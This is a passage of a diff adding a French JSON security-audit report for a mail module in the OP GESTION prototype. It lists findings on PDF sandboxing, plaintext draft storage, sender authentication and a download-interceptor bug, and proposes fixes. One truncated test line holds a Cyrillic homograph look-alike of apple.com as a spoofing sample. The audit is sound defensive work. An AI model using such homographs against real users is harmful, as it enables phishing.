+     "✗ zx3 : l'adresse écrite d'un lien est en lettres latines (un homographe — « аррӏе.com » en cyrillique — se lit comme « apple.com » : on affiche la forme réelle, xn--…) :: [\"https://аррӏе.co"
+    ]
+   }
+  },
+  "mutationsMethode": "OPG_SANS=courrier-0N courrier-corrections.py fabrique une copie qui garde CE défaut seulement ; la sonde qui le garde rejouée contre elle doit tomber sur les contrôles de ce défaut. Un correctif dont la mutation ne fait tomber aucun contrôle ne prouverait rien."
+ },
+ "constatsDeCode": [
+  {
+   "n": "courrier-c1",
+   "titre": "Le cadre d'aperçu d'un PDF de signature n'est pas sandboxé",
+   "etat": "CODE LU, non rejoué (signature éteinte dans le prototype : signer:false)",
+   "pourquoi": "Chromium refuse d'afficher un PDF dans un cadre sandboxé : le module le dit en commentaire et choisit de ne pas poser sandbox ; le PDF vient d'un blob fabriqué par la source de signature (les PDF d'un CORRESPONDANT ne s'y ouvrent jamais : les pièces reçues se téléchargent seulement).",
+   "correction": "dans la vraie application, le PDF à signer est celui de l'entreprise, servi par un domaine d'objets, avec CSP frame-ancestors et nosniff (R5)."
+  },
+  {
+   "n": "courrier-c2",
+   "titre": "Les brouillons et courriels écrits sont rangés en clair dans le rangement du navigateur (proto_courrier_<rôle>)",
+   "etat": "déjà rapporté (ponts-09, acces-04) : non recompté",
+   "pourquoi": "une XSS (courrier-01, 02) les lit tous.",
+   "correction": "dans la vraie application : brouillons côté serveur, rangement de l'appareil vidé à la déconnexion."
+  },
+  {
+   "n": "courrier-c3",
+   "titre": "La traduction d'un message envoie son texte à la source",
+   "etat": "CODE LU (capacité éteinte dans le prototype : traduire:false)",
+   "pourquoi": "dans la vraie application le texte d'un courriel part chez un sous-traitant (traducteur ou Anthropic) : à écrire dans sous-traitance.html, avec le geste explicite qui l'enclenche (déjà : un message, un geste).",
+   "correction": "texte du dossier juridique, pas du code."
+  },
+  {
+   "n": "courrier-c5",
+   "titre": "Le contrat de la boîte mail ne porte pas l'authenticité de l'expéditeur, alors que server/mail.js sait la lire",
+   "etat": "CODE LU (server/mail.js, server/index.js ~11576 ; apercu/prototype-courrier.js : aucune occurrence de spf, dkim, dmarc, authentication-results)",
+   "pourquoi": "courrier-03 : un courriel écrit au nom d'un vrai client passe pour lui. La lecture de l'authenticité existe pour la boîte des agents ; la boîte des personnes n'en profite pas.",
+   "correction": "règle R3 : un champ authentifie par message dans le contrat, et le bandeau « OP GESTION a reconnu » ne propose aucun geste d'argent quand il vaut non."
+  },
+  {
+   "n": "courrier-c4",
+   "titre": "Deux gestionnaires « annonce » (ml: et mbx:) écrivent deux formes différentes de f.annonce (une chaîne, un objet)",
+   "etat": "CODE LU",
+   "pourquoi": "selon le bouton, la lecture de f.annonce reçoit une chaîne ou un objet : pas une faille, mais deux chemins pour un même geste d'argent (courrier-03) ; un seul chemin se garde bien.",
+   "correction": "garder mbx:annonce et retirer ml:annonce quand le bandeau est la seule porte."
+  }
+ ],
+ "dejaRapporte": {
+  "injection-02": "l'unité d'un article s'écrit brute dans le Stock : courrier-06 y arrive aussi PAR UN FICHIER DE PRIX d'un tiers (plus seulement par un champ qu'on tape)",
+  "injection-07": "le nom d'un client s'écrit brut dans l'Accueil et les Statistiques, « non atteignable faute de geste qui renomme un client » : courrier-04 est ce geste, et la sortie est maintenant REJOUÉE (le nom exécuté à l'Accueil) — « C'est un client » reprend le NOM D'EXPÉDITEUR d'un inconnu",
+  "ponts-01 / ponts-02": "SVG et HTML de fichiers choisis exécutés depuis un blob : non recomptés ; ce qui est vérifié ici, c'est que les PIÈCES D'UN COURRIEL ne passent jamais par là (le module les enregistre en octet-stream, nom assaini)",
+  "ponts-09 / acces-04": "brouillons et courriels écrits rangés en clair dans le rangement du navigateur (proto_courrier_<rôle>) : non recomptés"
+ },
+ "signalementsHorsAngle": [
+  {
+   "n": "courrier-h1",
+   "titre": "Dans un onglet ORDINAIRE, plus aucun téléchargement ne démarre : le clic sur un lien blob: est intercepté par l'hôte, dont le bouton « Enregistrer » refait le même clic",
+   "nature": "défaut fonctionnel (pas une faille), trouvé en rejouant les téléchargements de pièces jointes ; à traiter par la voie « tout marche aussi dans l'artefact » (tâche 15)",
+   "preuve": "rejoué le 17 novembre 2026 (dl2.js, 127.0.0.1, onglet ordinaire, sans window.claude) : un bouton qui appelle telechargerFichier('essai.csv', …) puis un bouton qui crée un <a href=blob: download> et le clique : DANS LES DEUX CAS l'événement « download » du navigateur n'arrive pas et le panneau « Ce fichier ne s'affiche pas dans cette page : enregistre-le sur ton appareil » s'ouvre à la place. Avant l'ajout de l'intercepteur, 12 pièces sur 12 se téléchargeaient (courrier-fichiers.js, 3 exécutions) ; depuis, 0 sur 12 par le bouton de pièce du module, 0 sur 2 pour les tableaux de Véhicules.",
+   "ou": "apercu/prototype-op-gestion.html, vers 4598 : document.addEventListener('click', ev => { const a = ev.target.closest('a[href^=\"blob:\"]'); if (!a) return; ev.preventDefault(); voirFichierLocal(…) }) ; telechargerFichier (vers 4541) crée justement un <a href=blob: download> et le clique ; voirFichierLocal propose « Enregistrer », qui rappelle telechargerFichier : boucle.",
+   "correction": "ignorer les liens destinés à l'enregistrement : a[href^=\"blob:\"]:not([download]) (une ligne). La sonde courrier-fichiers.js ne dépend plus de l'événement « download » : elle note le nom que le module donne à telechargerFichier."
+  }
+ ]
 }
